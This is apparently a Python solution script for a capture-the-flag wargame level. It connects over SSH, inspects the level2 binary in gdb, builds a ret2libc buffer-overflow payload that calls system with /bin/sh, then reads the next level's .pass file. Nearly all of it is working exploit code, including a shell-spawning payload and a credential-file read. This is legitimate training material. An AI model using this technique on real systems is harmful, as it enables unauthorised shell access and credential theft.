import os
import sys
bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, connect_by_previous, exec_in_stream, exec_stream, upload_to
from utils.text import print_output, print_title
from utils.base import save_token, transform_address

from pwn import *

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

stream = exec_stream('./level1', title='Simple execute binary', stdin=True)
print_title('Okay, stdin intercepted, stdin write expected')

output = exec_in_stream(stream, 'test', title='Send test in stdin')
print_output(output)
print_title('Nothing happened')
print_title('Debug Time')

func_info = exec(client, 'echo "info func" | gdb ./level2 -q | egrep " p$| main$"', title='Get all functions')
print_output(func_info)
print_title('We have two entry points (main - 0x0804853f, p - 0x080484d4)')

main_structure = exec(client, 'echo "disass main" | gdb ./level2 -q', title='Get main structure')
print_output(main_structure)
print_title('Main call function `p`')

p_structure = exec(client, 'echo "disass p" | gdb ./level2 -q', title='Get P structure')
print_output(p_structure)
print_title('Read stdin and print it')

ret_address = exec(client, 'echo "disass p" | gdb ./level2 -q | grep ret', title='Get p return address')
print_output(ret_address)
ret_address = ret_address[0].split(' ', 1)[0]
ret_address_transformed = transform_address(ret_address)

system_address = exec(client, 'echo "b main\nr\ninfo func system" | gdb ./level2 -q | egrep "system$"',
                      title='Get system func address')
print_output(system_address)
system_address = system_address[0].split(' ', 1)[0]
system_address_transformed = transform_address(system_address)

upload_to('find_env.c')
upload_to('transform.py')

env_variable = 'SHELL'
exec(client, f'gcc /tmp/find_env.c -o /tmp/find_env', title='Compile find env program')


# exec(client, f"python -c '{script}' > /tmp/trick", title='Write exploit payload to file')


script = f'import os\n' \
         f'import ctypes\n' \
         f'libc = ctypes.CDLL("libc.so.6")\n' \
         f'getenv = libc.getenv\n' \
         f'getenv.restype = ctypes.c_voidp\n' \
         f'env_address = "0x%08x" % getenv("{env_variable}")\n' \
         f'command = "python /tmp/transform.py {{}}".format(env_address)\n' \
         f'env_address_transformed = os.popen(command).read().strip()\n' \
         f'print "a" * 80 + "{ret_address_transformed}" + "{system_address_transformed}" + "DUMM" + "{{}}".format(env_address_transformed.strip().decode("string-escape"))'


stream = exec_stream(f"export SHELL=/bin/sh && python -c '{script}' > /tmp/trick && cat /tmp/trick - | ./level2", title='Read trick file and redirect stdout in binary',
                     stdin=True, stderr=True, stdout=True)
# script = f'import os\n' \
#          f'command = "gcc /tmp/find_env.c -o /tmp/find_env"\n' \
#          f'os.popen(command)\n' \
#          f'command = "/tmp/find_env {env_variable}"\n' \
#          f'env_address = os.popen(command).read().strip()\n' \
#          f'command = "python /tmp/transform.py {{}}".format(env_address)\n' \
#          f'print "." * 80 + "{ret_address_transformed}" + "{system_address_transformed}" + "...." + "{{}}".format(os.popen(command).readline().strip().decode("string-escape"))'


a = exec_in_stream(stream, "cat /home/user/level3/.pass")
print(a)




